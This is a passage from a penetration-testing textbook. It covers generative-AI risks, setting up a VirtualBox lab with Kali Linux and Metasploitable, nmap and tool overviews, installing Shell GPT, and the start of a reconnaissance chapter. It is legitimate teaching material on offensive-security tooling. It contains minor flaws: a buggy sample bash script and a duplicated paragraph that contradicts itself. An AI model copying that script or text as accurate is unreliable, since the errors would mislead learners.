GenAI systems are beneficial or detrimental based on the quality of their training data. Biases or omissions in training data may result in distorted or unreliable outcomes. If an AI model is predominantly trained on contemporary attack techniques, it may fail to identify vulnerabilities in legacy systems or nonstandard environments. Likewise, unrepresentative data may cause the AI to overlook vulnerabilities pertinent solely to niche industries or specific organizational configurations. Addressing this necessitates meticulous selection of training datasets, followed by periodic updates to adapt to emerging cyber threats.

Skill gap in using AI tools

The integration of AI into PT workflows may pose a daunting learning curve for many secu-

rity professionals. Numerous individuals may lack technical expertise to effectively utilize GenAI tools and interpret their results, leading to inefficiency or misapplication. Moreover, the lack of seamless integration with other PT tools, such as Nmap, or Burp Suite, may hinder their overall utility without the necessary technical expertise.

RISKS ASSOCIATED WITH GENERATIVE AI IN PENETRATION

TESTING

Escalation of cyber threats

While GenAI can enhance the capabilities of security professionals, it may also be leveraged to benefit attackers. An assailant could employ AI to create advanced phishing emails, produce polymorphic malware, or automate the reconnaissance and exploitation stages. The

proficient application of AI for social engineering exemplifies this capability by nefarious individuals. Europol highlighted the utilization of LLMs in creating deepfakes or impersonating individuals, undermining trust and amplifying the effects of social engineering attacks.

The accessibility of these AI tools facilitates even the most ordinary hacker’s ability to exploit and manipulate them for intricate, evolving attack strategies.





Foundations of pentesting 31

Advanced persistent threats (APTs)

Hackers can exploit generative AI tools to create highly targeted and covert advanced per-

sistent threats (APTs). Malefactors may employ AI to assess vulnerabilities and develop customized exploits, thereby securing extended access to a network while evading detection.

Utilizing APTs enabled by polymorphic malware, which allows for dynamic code altera-

tion to circumvent conventional detection systems, hackers are poised to cause significantly greater harm to an organization.

Autonomous and self-propagating attacks

Due to the rapid advancement of AI technologies, the risks of autonomous cyberattacks may further evolve to adapt to new environments. Rapid self-propagating attacks can extensively infect networks from various perspectives, exploiting vulnerabilities autonomously. The researchers demonstrated that AI-generated malware can evade traditional security systems and can replicate itself with minor modifications, thereby increasing its difficulty to detect and contain.

Uncontrolled AI development

The swift progression of AI technologies may lead to the evolution of autonomous cyberat-

tack risks, enabling adaptation to new environments. Rapid self-propagating attacks can

extensively compromise networks from multiple angles, autonomously exploiting vulner-

abilities. The researchers illustrated that AI-generated malware can circumvent conventional security systems and can self-replicate with minimal alterations, thus enhancing its detectability and containment challenges.

CONCLUSION

PT is essential in contemporary cyberdefense, enabling organizations to proactively identify vulnerabilities and assess security measures. In addition to the technical advantages of PT, there are numerous actionable insights that align with the organization’s business objectives, enhancing the protection of critical assets, mitigating risk, and ensuring compliance. This chapter discusses methodologies, ranging from structural approaches such as OSSTMM and

NIST SP 800-115 to dynamic frameworks such as MITRE ATT&CK and the Cyber Kill

Chain, emphasizing the necessity and significance of standardized and repeatable processes

to attain reliable outcomes. The integration of AI tools signifies a significant transformation in the efficiency, accuracy, and scalability of PT operations. As cyber threats continue to evolve, PT emerges as a fundamental component of an organization’s defensive strategy,

allowing it to stay ahead of potential attackers while fostering trust and resilience in the dynamic realm of cyberspace.

The future of AI in PT is promising, featuring enhanced convergence, predictive analytics,

advanced natural language processing, and adaptive learning. Organizations that embrace

AI-driven PT solutions will enhance the efficiency of their security assessments and improve their preparedness for mitigating risks associated with an evolving array of cyber threats.

REFERENCES

Al-Sada, B., Sadighian, A., & Oligeri, G. (2024). MITRE ATT&CK: State of the Art and Way Forward.

ACM Computing Surveys, 57(1), 1–37.

32 Traditional vs Generative AI Pentesting

Bach-Nutman, M. (2020). Understanding the Top 10 owasp Vulnerabilities. ArXiv Preprint ArXiv:

2012.09960.

Bishop, M. (2007). About Penetration Testing. IEEE Security & Privacy, 5(6), 84–87. https://doi.

org/10.1109/MSP.2007.159

Chamkar, S. A., Maleh, Y., & Gherabi, N. (2022). The Human Factor Capabilities In Security Operation Center (SOC). EDPACS, 66(1), 1–14. https://doi.org/10.1080/07366981.2021.1977026

Chamkar, S. A., Maleh, Y., & Gherabi, N. (2024). Security Operations Centers: Use Case Best Practices,

Coverage, and Gap Analysis Based on MITRE Adversarial Tactics, Techniques, and Common

Knowledge. Journal of Cybersecurity and Privacy, 4(4), 777–793.

Copeland, M., & Copeland, M. (2021). Introduction to the MITRE Matrix. Cloud Defense Strategies

with Azure Sentinel: Hands-on Threat Hunting in Cloud Logs and Services, 213–254.

Dalalana Bertoglio, D., & Zorzo, A. F. (2017). Overview and Open Issues on Penetration Test. Journal

of the Brazilian Computer Society, 23, 1–16.

Dinis, B., & Serrão, C. (2014). Using PTES and Open-source Tools as a Way to Conduct External

Footprinting Security Assessments for Intelligence Gathering. Journal of Internet Technology and

Secured Transactions (JITST), 3/4, 271–279.

Fatima, A., Khan, T. A., Abdellatif, T. M., Zulfiqar, S., Asif, M., Safi, W., Al Hamadi, H., & Al-Kassem,

A. H. (2023). Impact and Research Challenges of Penetrating Testing and Vulnerability Assessment

on Network Threat. 2023 International Conference on Business Analytics for Technology and

Security (ICBATS), 1–8.

Giuseppi, A., Tortorelli, A., Germanà, R., Liberati, F., & Fiaschetti, A. (2019). Securing cyber-phys-

ical systems: an optimization framework based on OSSTMM and genetic algorithms. 2019 27th

Mediterranean Conference on Control and Automation (MED), 50–56.

Gupta, M., Akiri, C., Aryal, K., Parker, E., & Praharaj, L. (2023). From Chatgpt to Threatgpt: Impact

of Generative AI in Cybersecurity and Privacy. IEEE Access, 11, 80218–80245.

Hilario, E., Azam, S., Sundaram, J., Imran Mohammed, K., & Shanmugam, B. (2024). Generative AI

for Pentesting: The Good, the Bad, the Ugly. International Journal of Information Security, 23(3),

2075–2097.

Hubbard, J. (2020). Measuring and improving cyber defense using the mitre attack framework. SANS

Whitepaper.

Kinnunen, J. (2022). Threat Detection Gap Analysis Using MITRE ATT&CK Framework.

Malatji, M. (2023). Management of enterprise cyber security: A review of ISO/IEC 27001: 2022. 2023

International Conference on Cyber Management and Engineering (CyMaEn), 117–122.

Maleh, Y. (2023). Enhancing E-Learning Security in Cloud Environments: Risk Assessment and Penetration Testing. In Cybersecurity Management in Education Technologies: Risks and Countermeasures for Advancements in E-learning (pp. 171–210). https://doi.org/10.1201/9781003369042-9

Maleh, Y. (2024). Web Application PenTesting: A Comprehensive Guide for Professionals. CRC Press.

Maleh, Y., Sahid, A., Alazab, M., & Belaissaoui, M. (2021). IT Governance and Information Security: Guides, Standards, and Frameworks. In CRC Press. https://doi.org/10.1201/9781003161998

Nabila, M. A., Mas’udia, P. E., & Saptono, R. (2023). Analysis and Implementation of the ISSAF

Framework on OSSTMM on Website Security Vulnerabilities Testing in Polinema. Journal of

Telecommunication Network (Jurnal Jaringan Telekomunikasi), 13(1), 87–94.

Pascoe, C. E. (2023). Public Draft: The NIST Cybersecurity Framework 2.0.

Pennington, A., Applebaum, A., Nickels, K., Schulz, T., Strom, B., & Wunder, J. (2019). Getting started

with ATT&CK. MITRE Corporation.

Sabillon, R., Serra-Ruiz, J., Cavaller, V., & Cano, J. (2017). A Comprehensive Cybersecurity Audit Model to Improve Cybersecurity Assurance: The CyberSecurity Audit Model (CSAM). 2017

International Conference on Information Systems and Computer Science (INCISCOS), 253–259.

https://doi.org/10.1109/INCISCOS.2017.20

Samtani, S., Yu, S., Zhu, H., Patton, M., & Chen, H. (2016). Identifying SCADA Vulnerabilities Using Passive and Active Vulnerability Assessment Techniques. 2016 IEEE Conference on Intelligence and Security Informatics (ISI), 25–30. https://doi.org/10.1109/ISI.2016.7745438

Foundations of pentesting 33

Yadav, T., & Rao, A. M. (2015). Technical aspects of cyber kill chain. Security in Computing and

Communications: Third International Symposium, SSCC 2015, Kochi, India, August 10–13, 2015 .

Proceedings 3, 438–452.

Zaydi, M., & Maleh, Y. (2024). Empowering Red Teams with Generative AI: Transforming Penetration Testing Through Adaptive Intelligence. EDPACS, 1–26. https://doi.org/10.1080/07366981.2024.

2439628





Chapter 2

Building a modern penetration testing

lab with generative AI

TECHNICAL REQUIREMENTS

The technical requirements provided in this chapter are as follows:

• Any hypervisor, such as VMware or VirtualBox

• Windows 10 and 11 Professional or Enterprise

• Kali Linux 2024.3

• Vulnerable Machine (Metasploitable 2).

SET UP A VIRTUAL PT LABORATORY

In this book, you’ll learn how to use various tools in a controlled environment. To have a

controlled environment, we need to build one. There are several options for building a pen-

etration laboratory. Two options are proposed here:

• Utilize a cloud provider: Cloud providers such as Microsoft Azure, Amazon Web

Services, and Google Cloud give flexibility and scalability for system deployment at a

much reduced cost compared to purchasing dedicated hardware. The only disadvan-

tage of utilizing a cloud provider is the likely requirement for authorization to conduct

penetration testing on your installed services.

• Many prefer utilizing a high- performance laptop or desktop equipped with virtual-

ization software, as these devices are very affordable. Utilize virtualization tools such

as VMware and VirtualBox to establish a completely isolated network on your host

machine.

Figure 2.1 provides the network diagram for PT’s basic laboratory.

We will utilize four virtual machines including a Kali Linux server, a Windows server, and

a Windows 11 client. This laboratory has a contemporary environment that will facilitate the

testing and use of the most recent methods and exploits (Sahid & Maleh, 2023).

YOUR SECURITY

The first concern is your safety. Conducting penetration testing on a system without the

owner’s consent is unlawful and classified as a cybercrime. This may result in complications with the owner or law enforcement if issues intensify uncontrollably.

34

DOI: 10.1201/9781003640318-2





Building a modern penetration testing lab with generative AI 35

Figure 2.1 PT laboratory.

To mitigate such issues and ensure safety, you may host the diverse susceptible computers

present in your local penetration testing laboratory and exploit them.

UNDERSTANDING VIRTUALIZATION TECHNOLOGY

When setting up a PT laboratory, you have two options:

• Use locally hosted virtualization technology locally hosted (recommended)

• Set up a home laboratory with additional computer equipment and components

available.

This last solution (home lab) can be costly and complicated to set up and manage. You’ll

need to gather up all your computing devices and routers and use them to set up a lab. For

example, you could run your hacking distribution (e.g., Kali Linux) on Computer A and your

vulnerable machines on Computer B or C (DVWA or Mutillidae). You’ll also need routers, switches, and Ethernet cables to manage your network.

• Locally hosted solutions are far simpler to configure and administer, necessitating only a single robust PC equipped with virtualization technologies. This is the methodology

employed in this paper. Virtualization enables the simultaneous operation of several

operating systems on a single machine. To start, you must install virtualization software

and utilize it to operate the supplementary operating systems. The predominant soft-

ware packages are VirtualBox and VMware.

VirtualBox is free virtualization software developed by Oracle and distributed under the GNU General Public License (GPL) version 2.

VMware, on the other hand, is a commercial software company that produces several products. The only free version is VMware Workstation Player, which is for home or personal use. You’ll need to upgrade to VMware Workstation Pro for more advanced features, such

as snapshots.

Thus far, I believe you possess a solid comprehension of a PT laboratory and the requisite

technologies to establish one.

Let us proceed to establish our laboratory. The virtualization program selected for our labs is VirtualBox.





36 Traditional vs Generative AI Pentesting

TARGET MACHINES

As we progress through this book, we’ll be carrying out penetration tests on target machines.

For Microsoft Windows, we will use the evaluation center to download Windows 10

Enterprise and Windows Server 2016 or 2022.

• The Microsoft evaluation center can be accessed at https:// www. microsoft. com/ en- us/

evalcenter.

• The direct link for Windows Server 2016 is https:// www. microsoft. com/ en- us/ eval

center/ download- windows- server- 2016.



• For Windows 11 Enterprise, the direct link is https:// www. microsoft. com/ en- us/

software- download/ windows11ISO.

Metasploitable 2

Metasploitable 2 is an intentionally vulnerable machine that you can use to test Metasploit exploits to obtain shell permissions. Metasploitable differs from vulnerable machines in

focusing more on the operating system and network layer. Metasploitable currently comes in

three versions: Metasploitable, Metasploitable 2, and Metasploitable 3.

Step 1: Download and install VirtualBox on your PC

To get started, install VirtualBox on your current operating system. This can be Windows, Linux, or macOS. In addition, install VirtualBox guest Addition software, which consists of drivers and system applications that improve the performance of your virtual machines.

Other benefits of guest additions include:

• Mouse pointer integration

• Shared folders

• Improved video support

• Generic host/guest communication channels

• Transparent window management

• Shared clipboard

• Time synchronization

• Automated connection.

After successful installation, launch the virtual box from the application menu (Figure 2.2).

Step 2: Install Kali Linux on VirtualBox

Upon initiating VirtualBox, we may begin the installation of our virtual machines. We will

start by implementing the preferred PT distribution.

In this book, we will use Kali Linux. However, this should not prevent you from using

other security operating systems such as BlackArch Linux, Parrot, etc.

We will not require the download of the installation ISO file to set up the Kali Linux vir-

tual machine and customize it from the ground up (Linux, 2020). Currently, Kali Linux is offered in several forms.

• Bare Metal configuration is used for installing Kali Linux on your PC in either a singleboot or multi- boot setup.



Building a modern penetration testing lab with generative AI 37

Figure 2.2 VirtualBox interface.

• Virtual machines: This option offers prepared images for installation on your virtual-

ization software. The sole virtualization systems available for authoring are VMware

and VirtualBox.

• ARM configuration: Utilized for ARM devices, including the Raspberry Pi.

• Cloud setup.

• Docker container configuration.

• Live Boot Configuration.

• Windows Subsystem for Linux (WSL).

In our labs, we’re going to download the installation of the Kali Linux virtual machine for VirtualBox from the official Kali Linux download page. It’s a “.ova” file (Figure 2.3).

• Launch VirtualBox from your programs menu once the download is finished. Then,

follow these steps:

• Choose "Import appliance" from the File menu. Another option is to use the shortcut key (Ctrl + I) on your keyboard.

• It opens in a new window. After downloading the "Kali Linux.ova" file, locate it on your computer and click the "Next" button.

• Everything you need to know about the virtual machine is displayed in the following

window. To bring in the VM, go to the very bottom and find the import option.

• As you can see in Figure 2.4, VirtualBox will display Kali Linux after a successful import.

You can now start installing Kali Linux (Figure 2.5).





38 Traditional vs Generative AI Pentesting

Figure 2.3 Kali Linux download page.

Figure 2.4 Kali Linux machine on VirtualBox.





Building a modern penetration testing lab with generative AI 39

Figure 2.5 Kali Linux installation interface.

You can adjust the virtual machine parameters to suit your system resources. When you’re

finished, click Start to start the virtual machine. You don’t need to configure anything; just sit back and wait until you reach the Kali Linux login screen (Figure 2.6).

Now that Kali Linux is installed, you need to update the packages in the repositories and

upgrade the installed packages. Let’s move on to its basic commands (Figure 2.7).

You can now install other Windows operating systems and the Metasploitable 2 machine.

Figure 2.6 Kali Linux connection interface.





40 Traditional vs Generative AI Pentesting

Figure 2.7 Update and upgrade command.

KALI LINUX BASIC COMMANDS

A few basic commands in Kali Linux are very useful to know. These include locate, chmod,

find, ls, cd, and pwd:

▪ locate: I often use this command; it can be used to locate a specific file easily. Before using the locate command, you need to update the database using updatedb, as shown

in Figure 2.8.

• ls: This command lists the contents of the current directory. Use the -a switch to

display hidden files and folders.

• cd: This command changes the working directory. It is also known as the chdir

command.

• pwd: This command displays the working directory, that is, simply the name of the

directory in which you are working.

• chmod: This command is useful if you need to check a file’s permissions. When

downloaded, some tools require you to change the permissions to run them. For

example, chmod 600 ensures that only the owner of the file can read and write.

• find: This command is a more intense search tool than locate; here, find searches for

any given path, as shown in Figure 2.9.

Figure 2.8 Locate command.

Figure 2.9 Find command.





Building a modern penetration testing lab with generative AI 41

All these commands are a good starting point for familiarizing yourself with the basic functions of Kali Linux. If you’re looking for a complete list of commands from A to Z, you can easily find it using your favorite search engine.

Scripting Kali Linux: Kali Linux is relatively verbose – you can leverage bash scripting to create complex scripts, which you can then leverage for penetration testing.

A sample script that performs a Nmap scan is as follows:

read -p "Target IP/Range: " $targetIP echo "$targetIP"

Nmap -sS -O -v "$targetIP"

In this script, we ask the system to print the text read -p "Target IP/Range:", which we associate with the variable $targetIP. In the next line, we display the range of IP addresses using the echo command, passed as an argument. In the last line, we perform a simple Nmap

scan, using the -sS switch, which scans the TCP port SYN command; the -O, which performs

remote operating system detection; and -v, which increases the verbosity level.

The syntax for using nmap scripts is similar to that of the basic nmap command, except the

"--script=" keyword. To invoke an NSE, you can use the keyword --script= followed by the name of the script or the script category and finally followed by the IP address of the target system, for example:

kali > nmap --script vuln 192.168.1.102

This command will launch a series of scripts in the "vuln" category and display data only if

a vulnerability is found (Figure 2.10).

In the course of this book, we’ll explore other scripts. As you progress through the PT

journey, you’re likely to develop your list of useful scripts.

PT TOOLS

Various tools or frameworks are accessible at each phase of the penetration testing process to collect information and execute diverse sorts of attacks. This section delineates some fun-

damental infiltration tools (Maleh, 2024).

PT PLATFORM

Kali Linux is a Debian- derived Linux system designed for sophisticated penetration test-

ing and security assessment. It is supported and financed by Offensive Security. Kali Linux comprises more than 600 penetration testing tools for many information security functions,

including penetration testing, security research, forensics, and reverse engineering. Kali Linux is specifically tailored to fulfill the requirements of IT security specialists.

INFORMATION GATHERING

Information gathering on the server configuration that hosts a web application is essential, as flaws at any tier might jeopardize the entire system (Baloch, 2017). Penetration testers



42 Traditional vs Generative AI Pentesting

Figure 2.10 An example of an Nmap script.

concentrate on determining the versions of the web server, application, and framework to

uncover known vulnerabilities and possible exploits. This necessitates the examination of

replies to certain server instructions and their comparison with a database of recognized

signatures. Comprehending the application components and framework helps facilitate the

testing process. Analyzing webpage comments, metadata, and server metafiles is essential

for identifying unintentional information breaches, such as directory paths. Furthermore,

delineating the application’s execution route is crucial for thorough testing, since neglecting even small configuration discrepancies might provide substantial hazards. Cataloging server programs and identifying their access points aids in uncovering possible attack vectors, particularly in obsolete or misconfigured applications. This comprehensive method of informa-

tion collection establishes the foundation for efficient penetration testing.

Google Hacking: Google hacking is a method that utilizes a search engine, mostly Google, to identify flaws or access sensitive information. This strategy can produce information

that is challenging to find with basic search searches (Svensson, 2016).

OSINT Tools: Open Source Intelligence denotes information that may be lawfully gath-

ered from publicly accessible sources on an individual or organization. In practice, the

term often refers to materials available on the internet; but theoretically, any public

information qualifies as OSINT, including books or reports in a public library, news-

paper articles, or remarks in a press release. OSINT tools are employed to gather and

analyze data from the web, available in diverse formats such as text, documents, pho-

tos, and more (Pastor- Galindo et al., 2020).





Building a modern penetration testing lab with generative AI 43

Nikto: Nikto is an open- source security tool that does thorough assessments of web servers for various vulnerabilities. It can detect several potentially dangerous apps and files.

Nmap: Nmap is an open- source utility that facilitates vulnerability assessment and network exploration. It is predominantly utilized by network administrators to identify

devices operating within their systems (Lyon, 2011).

VULNERABILITY SCANNER NESSUS AND OpenVAS

A vulnerability scanner is a software tool that autonomously identifies and detects secu-

rity weaknesses in computers, information systems, networks, and applications. It detects

vulnerabilities by transmitting specified packets to the target and subsequently evaluating the answers to correlate them with its vulnerability database. Nessus is the most renowned

vulnerability scanner globally, utilized by more than 75,000 businesses. This program has

an extensive vulnerability scanning capability, and its vulnerability database is regularly updated. OpenVAS, akin to Nessus, is an open- source derivative of the Nessus project and

ranks among the most prominent vulnerability scanners (Rahalkar & Rahalkar, 2019).

During the information- gathering phase, a vulnerability scanner is the most effective method for identifying known vulnerabilities inside the target system (Al Anhar & Suryanto, 2021a).

Web application testing platforms

Performing penetration testing or utilizing online Vulnerability Scanners (WVSs) on online

applications without specific authority is unethical and may result in legal consequences. To address these challenges and establish a credible setting for tool evaluation and skill enhancement, deliberately vulnerable web apps have been developed. These systems possess intrinsic security vulnerabilities, providing a regulated setting for cybersecurity experts to refine their skills (Al Anhar & Suryanto, 2021b).

Examples of training platforms

The cybersecurity industry has created a range of purposely vulnerable apps, encompassing

both old web applications and contemporary single- page applications. This section presents a compilation of various platforms, sourced from the OWASP Vulnerable Web Application

Directory.

• Broken Crystals is a virtual marketplace for rare gemstones, developed using Node.

js and the React JavaScript package. It encompasses many prevalent vulnerabilities,

including Cross- Site Scripting (XSS) and SQL Injection (SQLi), providing a pragmatic

environment for security investigation.

• Damn Vulnerable Web Application (DVWA): DVWA is constructed using PHP and

MySQL, exemplifying a conventional multi- page web application. It has been exten-

sively employed as an instructional tool to illustrate web security issues.

• Hackazon simulates an e- commerce platform using an AJAX- based UI. Users can

design vulnerabilities inside the program to circumvent expected testing patterns, hence

averting any potential “cheating” where the scanner may identify the System Under Test

(SUT) and its flaws.

• OWASP Juice Shop is constructed on Node.js and employs technologies such as Express

for the backend and Angular for the frontend. It encompasses all the vulnerabilities

enumerated in the OWASP Top Ten, functioning as a thorough instructional resource.





44 Traditional vs Generative AI Pentesting

• OWASP Security Shepherd: Another OWASP effort, Security Shepherd, functions as an

educational platform for online and mobile application security. Created in Java and

using Jakarta Server Pages for dynamic content presentation, it encompasses a range of

prevalent vulnerabilities.

• OWASP WebGoat concentrates on Java applications, offering courses that encompass

the entirety of the OWASP Top Ten vulnerabilities, facilitating focused learning sessions.

• WackoPicko: Initially created for scholarly study and shown at a prominent interna-

tional security conference, WackoPicko is a PHP and MySQL web application that

includes functionalities such as photo sharing and purchase. It has been commonly

employed as a standard in WVS research.

This section outlines the many software tools utilized for thorough penetration testing, each defined by its purpose.

Burp suite: Provided by the company, Burp Suite is an integrated platform packed with numerous functionalities (Rahalkar & Rahalkar, 2021; Torres, 2020). Key features include:

• HTTP Proxy: Functions as a man- in- the- middle web proxy, enabling the inspection and alteration of traffic between the browser and server.

• Scanner: Automates the detection of web application vulnerabilities.

• Intruder: Conducts automated attacks, generating malicious requests to identify

SQL Injections, XSS, parameter tampering, and other vulnerabilities.

• Spider: Crawls web applications, aiding in the rapid mapping of their content and features.

• Repeater: Allows for manual testing by sending modified server requests and observing the outcomes.

• Decoder: Decodes data into its original format or encodes raw data in multiple

ways, identifying several encoding formats through heuristic analysis.

• Comparer: Enables comparison between data items.

• Sequencer: Assesses the randomness in data sequences, useful for evaluating session tokens or similar data meant to be unpredictable.

• Extender: Integrates Burp extensions, enhancing functionality with custom or third-party code.

OWASP ZAP: The OWASP Zed Attack Proxy is a free web application security scanner

that includes a proxy feature for intercepting and modifying network traffic (Jobin

et al., 2021).

SQLMap: An open- source tool, SQLMap automates the identification and exploitation

of SQL injection vulnerabilities, empowering database server takeovers. It is equipped

with a potent detection engine and an extensive array of functionalities suitable for any

pen- tester.

Metasploit framework: A robust platform for developing and executing exploit code

against remote targets, enabling penetration testers to simulate attacks and test system vulnerabilities (Kennedy et al., 2024; Velu, 2022).

Generative AI in penetration testing

Generative AI, especially tools such as Shell GPT (SGPT), fundamentally redefines penetra-

tion testing, enhancing the efficiency and adaptability of penetration testers’ job. This section elucidates the direct use of Generative AI in post- exploitation activities, privilege escalation, and lateral movements, aimed at enhancing a pentester’s skills (Hilario et al., 2024).





Building a modern penetration testing lab with generative AI 45

The final phase of preparation involved integrating the ChatGPT API into the penetra-

tion testing framework, executed through Shell_GPT (sgpt), a Python- based command- line

interface that utilizes ChatGPT’s API to perform functions such as responding to prompts,

generating shell commands, producing code snippets, and documenting processes. Integrated

the ChatGPT API with widely utilized penetration testing tools such as Nmap, Nessus, and

OpenVAS. The interface between these tools and ChatGPT was enabled via Python or a com-

parable programming language. This configuration enabled the execution of automatic scans

with instantaneous evaluation of their results.

This interface enables ChatGPT to consistently analyze tool results in real- time, deliver-

ing actionable insights while minimizing the manual effort often involved in result interpretation. This functionality sped penetration testing operations and enabled the issuance of

more detailed and contextually appropriate suggestions. The interaction with the output data enabled an accurate and pragmatic guide from ChatGPT, hence enhancing overall process

efficiency (Zaydi & Maleh, 2024).

The utilization of Shell_GPT as the interface for this experiment facilitated the assessment of the practical application of generative AI in real- world penetration testing settings. The distinction between the utilization of sgpt and ChatGPT became increasingly evident; sgpt enabled

CLI interactions, whereas direct engagement with ChatGPT was occasionally incorporated. The differentiation between ChatGPT’s overall functionalities and its web interface was elucidated to clarify the instruments employed throughout the assessments. This demonstrated how generative AI may augment the usefulness and efficacy of conventional penetration testing methods.

So let’s start the installation steps:

1. Update Your Kali Machine: Always start by updating your Kali Linux system to ensure all existing packages are up- to- date. Run sudo apt- get update && sudo apt- get upgrade in the terminal.

2. Install Python: ChatGPT requires Python, so install it by running sudo apt- get install python3.

Note: If you have installed python and PIP before you don’t need to install it again (Figure 2.11).

3. Install PIP: PIP is a package manager for Python. Install it with sudo apt- get install python3- pip (Figure 2.12).

Figure 2.11 Install Python.

Figure 2.12 Install PIP.





46 Traditional vs Generative AI Pentesting

4. Install JQ: We would be needing a program called “JQ.” Install it with ‘ sudo apt install jq ’ (Figure 2.13).

5. Install Shell GPT: You install Shell GPT by running ‘sudo pip install shell-

gpt’

(Figure 2.14).

6. Change Directory: Changing the directory using the command ‘cd ~/.local/bin/’.

7. Start using Shell GPT: To use Shell GPT you need to run the command ‘python sgpt’

(Figure 2.15).

8. Input API KEY: The API KEY you generated has to be pasted here.

Figure 2.13 Install JQ.

Figure 2.14 Install shell GPT.





Building a modern penetration testing lab with generative AI 47

Figure 2.15 Change directory.

Figure 2.16 API keys.

Figure 2.17 Create new secret key.

To generate your API keys, you have to visit https:// platform. openai. com/ api- keys and

sign in with your account (Figure 2.16).

And click Create New Secret key (Figure 2.17) copy the key (Figure 2.18).





48 Traditional vs Generative AI Pentesting

Figure 2.18 Save the key.

9. Paste API KEY: The API KEY you generated has to be pasted and press enter

(Figure 2.19).

Note: If you have misconfigured the key or you need to check you put the right key you can open this file to double- check if you put the right key (Figure 2.20).

10. Start using Shell GPT: Then you can ask Shell GPT any question you want to ask but NOTE That you have to navigate to the ~/.local/bin directory before you can start

using Shell GPT. That would be stressful you know considering the fact you have to

restart your Kali machine multiple times daily.

That’s why we came up with a solution to start up your Shell GPT without having to navigate to the ~/.local/bin directory always all you have to do is just to type the command sgpt from anywhere and boom you are in…. We can do this by putting the directory where the python

binaries and shell are located in the path environment variable using the command:

“export PATH=$PATH:~/.local/bin:/usr/bin/python3”

Figure 2.19 Paste API key.

Figure 2.20 Shell GPT directory.





Building a modern penetration testing lab with generative AI 49

CONCLUSION

This chapter laid the foundation for preparing a modern penetration testing (PT) lab, inte-

grating Generative AI (GenAI)tools such as Shell GPT with Kali Linux to enhance automa-

tion and efficiency. We covered the installation and configuration of VirtualBox and Kali

Linux, the deployment of pre- configured virtual machines, and the setup of a secure PT lab environment. Additionally, we explored how Shell GPT can streamline workflows by generating shell commands, automating tool interactions (e.g., Nmap, Nessus), and interpreting

outputs to provide actionable insights in real time.

By combining traditional tools with GenAI capabilities, this chapter demonstrated how

penetration testing can evolve beyond manual efforts into an AI- augmented process. You

are now equipped to install and configure Kali Linux, integrate advanced tools such as Shell GPT, and utilize scripting and Linux commands for PT workflows. This foundational knowledge not only empowers you to set up an efficient PT lab but also provides insight into leveraging GenAI for penetration testing.

REFERENCES

Al Anhar, A., & Suryanto, Y. (2021a). Evaluation of web application vulnerability scanner for mod-

ern web application. 2021 International Conference on Artificial Intelligence and Computer Science

Technology (ICAICST), 200–204.

Al Anhar, A., & Suryanto, Y. (2021b). Evaluation of web application vulnerability scanner for mod-

ern web application. 2021 International Conference on Artificial Intelligence and Computer Science

Technology (ICAICST), 200–204.

Baloch, R. (2017). Ethical hacking and penetration testing guide. Auerbach Publications.

Hilario, E., Azam, S., Sundaram, J., Imran Mohammed, K., & Shanmugam, B. (2024). Generative AI for

pentesting: the good, the bad, the ugly. International Journal of Information Security, 23(3), 2075–2097.

Jobin, T., Kanjirapally, K., Babu, K. S., & Scholar, P. (2021). Owasp Zed Attack Proxy. Proceedings

of the National Conference on Emerging Computer Applications (NCECA), Kottayam, India, 106.

Kennedy, D., Aharoni, M., Kearns, D., O’Gorman, J., & Graham, D. G. (2024). Metasploit. No Starch

Press.

Linux, K. (2020). Kali Linux. Obtenido de Official Kali Linux Documentation: https:// docs. kali. org

Lyon, G. (2011). Nmap Network Mapper.

Maleh, Y. (2024). Web application PenTesting: A comprehensive Guide for professionals. CRC Press.

Pastor- Galindo, J., Nespoli, P., Mármol, F. G., & Pérez, G. M. (2020). The not yet exploited goldmine of

OSINT: Opportunities, open challenges and future trends. IEEE Access, 8, 10282–10304.

Rahalkar, S., & Rahalkar, S. (2019). Openvas. Quick Start Guide to Penetration Testing: With NMAP,

OpenVAS and Metasploit, 47–71.

Rahalkar, S., & Rahalkar, S. (2021). Introduction to Burp Suite. A Complete Guide to Burp Suite:

Learn to Detect Application Vulnerabilities, 1–10.

Sahid, A., & Maleh, Y. (2023). Enhancing Cybersecurity Education: Integrating Virtual Cloud-Based Labs into the Curriculum. In Cybersecurity Management in Education Technologies: Risks and Countermeasures for Advancements in E-learning (pp. 150–170). https://doi.org/10.1201/

9781003369042- 8

Svensson, R. (2016). From Hacking to Report Writing An Introduction to Security and Penetration

Testing. Springer.

Torres, J. (2020). Offensive Security Using Burp Suite. Computer Science. http:// hdl. handle. net/ 20. 500.

12475/ 1066

Velu, V. K. (2022). Mastering Kali Linux for Advanced Penetration Testing: Become a cybersecurity

ethical hacking expert using Metasploit, Nmap, Wireshark, and Burp Suite. Packt Publishing Ltd.

Zaydi, M., & Maleh, Y. (2024). Empowering Red Teams with Generative AI: Transforming Penetration Testing Through Adaptive Intelligence. EDPACS, 1–26. https://doi.org/10.1080/07366981.2024.

2439628





Chapter 3

GenAI- driven reconnaissance for effective

penetration testing

RECONNAISSANCE

Reconnaissance, referred to as “footprinting,” constitutes the initial phase of penetration testing and ethical hacking. Reconnaissance involves collecting extensive information about a target system or organization before initiating direct engagement, effectively producing a comprehensive “blueprint” of the target’s security framework, highlighting potential entry

points and associated risks linked to publicly accessible information (Dinis & Serrão, 2014).

Footprinting aims to understand the architectural framework, fundamental principles, and

vulnerabilities of a target organization for potential hacking or penetration testing. Moreover, through meticulous reconnaissance, such testing could address the firm’s vulnerabilities. An effective and well- integrated reconnaissance process will ensure that the outcomes of the

completed penetration tests will be addressed subsequently (Maleh, 2024).

Objectives of reconnaissance and footprinting

• Risk Identification: Recognize vulnerabilities within publicly available information.

• Target Assessment: Evaluate the organization’s infrastructure and network to uncover potential points of penetration.

• Blueprint Development: Construct a detailed map of the target’s security profile, including assets, configurations, and user systems.

Types of footprinting

Footprinting can be categorized into two primary types: Passive Footprinting and Active Footprinting.

Passive footprinting

Passive footprinting involves the collection of information about targets while indirectly

investigating them for any interactions. The target is unaware of any reconnaissance activities; no communications or direct inquiries are directed toward the target system. This

method typically utilizes publicly accessible resources and archived data to collect intelligence (Hwang et al., 2022).

Methods of Passive Footprinting:

• Open- Source Intelligence (OSINT): Utilizing public search engines, databases, and forums.

50

DOI: 10.1201/9781003640318-3





GenAI-driven reconnaissance for effective penetration testing 51

• Proprietary Databases: Leveraging paid services and public records.

• Social Media and Networking Platforms: Analyzing organizational profiles and

employee activities.

• Third- Party Intelligence Sharing: Collaborating with partners or industry groups.

Passive footprinting maintains anonymity during reconnaissance and requires significant creativity and analytical skills to extract meaningful insights from public data.

Active footprinting

Active footprinting entails direct engagement with the target system or network. This term

